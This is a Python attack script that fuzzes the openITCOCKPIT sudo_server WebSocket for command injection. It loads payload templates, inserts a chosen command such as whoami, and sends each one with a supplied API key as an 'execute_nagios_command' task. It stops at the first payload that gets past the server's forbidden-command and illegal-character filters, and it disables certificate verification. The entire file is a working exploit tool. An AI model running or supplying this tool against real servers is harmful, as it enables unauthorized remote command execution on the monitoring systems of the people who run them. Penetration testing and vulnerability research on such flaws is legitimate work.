#!/usr/bin/env python3


"""
Usage:
python3 bypass_cmd_inj_fuzzer.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e --cmd whoami
"""

import argparse
import websocket
import ssl
import json
import time
import sys

uniqid = ""
key = ""

def parse_message(message):
    try:
        return json.loads(message)
    except json.JSONDecodeError:
        print("[!] Failed to parse message:", message)
        return {}

def build_request(task, data):
    return json.dumps({
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    })

def send_command(ws, cmd):
    global uniqid
    try:
        # Receive server hello with uniqid
        hello = parse_message(ws.recv())
        if "uniqid" in hello:
            uniqid = hello["uniqid"]
        else:
            print("[!] No uniqid received from server.")
            return False

        # Send the command
        ws.send(build_request("execute_nagios_command", cmd))

        # Listen for responses
        while True:
            try:
                response = parse_message(ws.recv())
                if response.get("uniqid") != uniqid:
                    continue  # skip irrelevant messages

                payload = response.get("payload", "")
                if "Forbidden command" in payload or "illegal characters" in payload:
                    return False  # Invalid command
                else:
                    print(f"\n[+] Allowed command: {cmd}")
                    print(f"[+] Response:\n{payload}")
                    return True
            except KeyError:
                continue  # ignore invalid messages
    except Exception as e:
        print(f"[!] Error during command send: {e}")
        return False
    finally:
        ws.close()

def main():
    global key

    parser = argparse.ArgumentParser(description="WebSocket command injection tester")
    parser.add_argument('--url', '-u', required=True, help='WebSocket URL')
    parser.add_argument('--key', '-k', required=True, help='OpenITCOCKPIT Key')
    parser.add_argument('--template', '-t', default='command-injection-template.txt', help='Template file with payloads')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable WebSocket debug output')
    parser.add_argument('--cmd', help='Command to inject (default: whoami)', default='whoami')
    args = parser.parse_args()

    key = args.key
    websocket.enableTrace(args.verbose)

    found = False  # Track if we get a valid payload

    try:
        with open(args.template) as f:
            for raw_line in f:
                template = raw_line.strip()
                if not template:
                    continue

                payload = template.replace("{cmd}", args.cmd)
                sys.stdout.write(f"Trying: {payload}\r")
                sys.stdout.flush()

                ws = websocket.create_connection(args.url, sslopt={"cert_reqs": ssl.CERT_NONE})
                if send_command(ws, payload):
                    found = True
                    break  # Stop after first successful command
                else:
                    sys.stdout.write("\033[K")  # Clear line

        if not found:
            print("\n[-] All payloads were rejected.")

    except FileNotFoundError:
        print(f"[!] Template file not found: {args.template}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


if __name__ == "__main__":
    main()
